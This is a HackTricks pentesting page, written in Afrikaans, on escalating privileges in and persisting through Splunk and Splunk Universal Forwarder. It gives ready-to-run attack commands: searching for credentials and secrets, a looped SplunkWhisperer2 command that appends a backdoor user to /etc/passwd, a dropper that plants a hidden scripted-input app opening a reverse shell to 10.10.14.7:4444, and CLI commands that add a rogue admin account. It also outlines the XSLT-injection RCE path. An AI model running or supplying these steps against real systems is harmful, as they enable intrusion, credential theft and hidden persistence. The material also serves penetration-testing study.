# Splunk LPE en Persistence

{{#include ../../banners/hacktricks-training.md}}

As jy ’n masjien **intern** of **ekstern** **enumerateer** en vind dat **Splunk loop** (gewoonlik **8000** vir die web-UI en **8089** vir die management API), kan geldige credentials dikwels deur app installation, scripted inputs of management actions in **code execution** omskep word. As Splunk as **root** loop, lei dit dikwels onmiddellik tot **privilege escalation**.

As jy slegs die generiese remote attack surface, enumeration of app-upload RCE path benodig, kyk na:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

As jy **reeds root** is en die Splunk-diens nie slegs op localhost luister nie, kan jy ook **Splunk password hashes** steel, **encrypted secrets** herstel, of ’n **malicious app** stoot om persistence plaaslik of oor verskeie forwarders te behou.

## Interessante Plaaslike Lêers

Wanneer jy op ’n host land waarop Splunk of Splunk Universal Forwarder loop, is hierdie gewoonlik die interessantste paaie:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Belangrike artefakte:

- **`$SPLUNK_HOME/etc/passwd`**: plaaslike Splunk-gebruikers en wagwoord-hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: sleutel wat deur Splunk gebruik word om secrets wat in verskeie `.conf`-lêers gestoor word, te enkripteer.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: aanvanklike admin-bootstrap-lêer; nuttig in gold images en provisioning-foute. Dit word geïgnoreer indien `etc/passwd` reeds bestaan.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: waar scripted inputs gewoonlik geaktiveer word.
- **`$SPLUNK_HOME/etc/deployment-apps/`** of **`$SPLUNK_HOME/etc/apps/`**: goeie plekke om 'n persistente app weg te steek of te hersien wat reeds versprei word.

## Splunk Universal Forwarder Agent Exploit Summary

Vir verdere besonderhede, kyk na [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dit is slegs 'n opsomming:<sup>[[1]](#references)</sup>

**Exploit-oorsig:**
'n Exploit wat die Splunk Universal Forwarder (UF) teiken, stel aanvallers met die **agent password** in staat om arbitrêre code uit te voer op stelsels waarop die agent loop, wat moontlik 'n groot gedeelte van die omgewing kan kompromitteer.

**Waarom dit werk:**

- Die UF-management service word algemeen op **TCP 8089** blootgestel.
- Aanvallers kan by die API authenticate en die forwarder opdrag gee om 'n **malicious app bundle** te installeer.
- Dieselfde primitive kan plaaslik vir **LPE** of op afstand vir **RCE** gebruik word.
- Public tooling soos **SplunkWhisperer2** skep die app bundle outomaties en kan payloads vir Linux-teikens aanpas.

**Algemene maniere om die password te recover:**

- Cleartext credentials in documentation, scripts, shares of deployment automation.
- Password hashes binne `$SPLUNK_HOME/etc/passwd`, gevolg deur offline cracking.
- Golden images of provisioning leftovers soos `user-seed.conf`.

**Impak:**

- SYSTEM/root-level code execution op elke gekompromitteerde host.
- Deployment van persistente apps, backdoors of ransomware.
- Deaktivering van of tampering met telemetry voordat die data aangestuur word.

**Voorbeeldopdrag vir exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Bruikbare publieke exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

As jy **filesystem write access** as `root`/`splunk` het, of authenticated access om apps te installeer, is ’n baie betroubare persistence-meganisme om ’n **custom app** met ’n **scripted input** te plaas.<sup>[[2]](#references)</sup> Splunk se eie dokumentasie verwag dat scripted inputs binne ’n app-gids geleë is en vanaf `inputs.conf` geaktiveer word.

Tipiese uitleg:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimale `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Vinnige Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- Dieselfde trick werk op **Universal Forwarder** met `/opt/splunkforwarder/etc/apps/`.
- Aanvallers smelt dikwels in deur ’n legitieme add-on te wysig in plaas daarvan om ’n ooglopend malicious app te skep.
- Op ’n **deployment server** verander die plant van ’n malicious app binne `deployment-apps/` in **fleet-wide persistence**, omdat forwarders vir opgedateerde apps poll, dit aflaai en dikwels herbegin om dit toe te pas.

## Credential Theft en Admin Takeover

As jy Splunk se plaaslike lêers kan lees, is daar gewoonlik twee goeie doelwitte: herstel **Splunk admin access** en herstel **encrypted service credentials**.

### Password hashes en plaaslike gebruikers

Splunk stoor plaaslike authentication-data in `etc/passwd`. Afhangend van die deployment, kan die cracking van daardie lêer werkende credentials vir die web-UI en die management API herstel.

As jy reeds geldige **admin** credentials het en Splunk sy **native** authentication backend gebruik, kan die CLI self vir persistence gebruik word:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` en encrypted values

Splunk gebruik `etc/auth/splunk.secret` om sensitiewe waardes wat in verskeie konfigurasielêers gestoor word, te beskerm. As jy beide die **secret** en die relevante **`.conf`-lêers** kan steel, kan jy dikwels die volgende herwin of hergebruik:

- forwarder/indexer shared secrets soos `pass4SymmKey`
- TLS private-key passwords soos `sslPassword`
- LDAP bind credentials soos `bindDNPassword`

Dit is nuttig vir **lateral movement**, selfs wanneer die Splunk admin password self nie crackable is nie.

### Misbruik van `user-seed.conf`

`user-seed.conf` word slegs tydens die eerste start gebruik, of wanneer `etc/passwd` nie bestaan nie. Dit maak dit minder nuttig op 'n live box, maar baie interessant in:

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances waar Splunk outomaties herinitialized word

In hierdie gevalle gee die plasing van 'n `HASHED_PASSWORD` wat met `splunk hash-passwd` gegenereer is, jou 'n stil manier om admin access ná redeployment te herwin.

## Misbruik van Splunk Queries

Vir verdere besonderhede, kyk na [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

'n Nuttige onlangse tegniek is om **user-supplied XSLT** in kwesbare Splunk Enterprise-weergawes te misbruik om 'n low-privileged authenticated account in **OS command execution** as die `splunk` user te omskep.

High-level flow:

1. Authenticate teen Splunk.
2. Upload 'n malicious **XSL**-lêer deur die preview/upload functionality.
3. Laat Splunk search results render met daardie uploaded stylesheet vanuit die **dispatch** directory.
4. Gebruik die XSLT payload om 'n lêer te skryf of execution deur Splunk se search pipeline te trigger (byvoorbeeld deur interne functionality soos `runshellscript` te bereik).

Die belangrikste offensive takeaway is dat hierdie path **post-auth RCE without needing app upload** is. Op Linux gee dit jou gewoonlik toegang as die **`splunk`** account, wat steeds waardevol is omdat daardie user dikwels die application tree besit, secrets kan lees en persistent apps kan plant wat shell loss oorleef.

'n Representative path wat tydens exploitation gebruik word, is:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
As Splunk met te veel voorregte loop, of as die `splunk`-gebruiker toegang het tot gevaarlike scripts, skryfbare diens-eenhede of swak `sudo`-reëls, word dit ’n netjiese **LPE**-ketting.

## Verwysings

- [1] [Misbruik van Splunk Forwarders vir RCE en Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Pasop vir TraitorWare: Gebruik van Splunk vir Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
